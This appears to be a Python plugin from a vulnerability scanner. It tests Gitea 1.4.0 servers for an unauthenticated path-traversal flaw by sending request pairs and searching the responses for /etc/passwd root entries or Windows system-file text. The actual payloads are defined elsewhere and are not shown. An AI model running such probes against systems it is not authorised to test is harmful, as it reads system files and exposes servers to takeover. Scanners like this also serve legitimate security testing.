#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.logger import logger
from thirdparty import requests
import re

def unauth_scan(self, url):
    ''' 其1.4.0版本中有一处逻辑错误, 导致未授权用户可以穿越目录, 读写任意文件, 最终导致执行任意命令 '''
    vul_info = {}
    vul_info['app_name'] = self.app_name
    vul_info['vul_type'] = 'unAuthorized'
    vul_info['vul_id'] = 'Gitea-unAuthorized'
    vul_info['vul_method'] = 'POST/GET'

    for payload in range(len(self.unauth_payloads)):
        path = self.unauth_payloads[payload]['path']
        data = self.unauth_payloads[payload]['data']
        headers = self.unauth_payloads[payload]['headers']
        target = url + path

        vul_info['path'] = path
        vul_info['data'] = data
        vul_info['headers'] = headers
        vul_info['target'] = target

        try:
            if (payload in [0, 2]):
                res1 = requests.post(
                    target, 
                    timeout=self.timeout, 
                    headers=headers,
                    data=data, 
                    proxies=self.proxies, 
                    verify=False,
                    allow_redirects=False
                )
                logger.logging(vul_info, res1.status_code, res1)                        # * LOG
                
                if (res1.status_code in [202, 401]):
                    path = self.unauth_payloads[payload+1]['path']
                    headers = self.unauth_payloads[payload+1]['headers']
                    target = url + path

                    res2 = requests.get(
                        target, 
                        timeout=self.timeout, 
                        headers=headers,
                        proxies=self.proxies, 
                        verify=False,
                        allow_redirects=False
                    )
                    logger.logging(vul_info, res2.status_code, res2)                        # * LOG

                    if (re.search(r'root:(x{1}|.*):\d{1,7}:\d{1,7}:root', res2.text, re.I|re.M|re.S)
                        or (('Microsoft Corp' in res2.text) 
                            and ('Microsoft TCP/IP for Windows' in res2.text))
                    ):
                        results = {
                            'Target': target,
                            'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                            'Request-1': res1,
                            'Request-2': res2
                        }
                        return results
            else:
                continue

        except requests.ConnectTimeout:
            logger.logging(vul_info, 'Timeout')
            return None
        except requests.ConnectionError:
            logger.logging(vul_info, 'Faild')
            return None
        except:
            logger.logging(vul_info, 'Error')
            return None
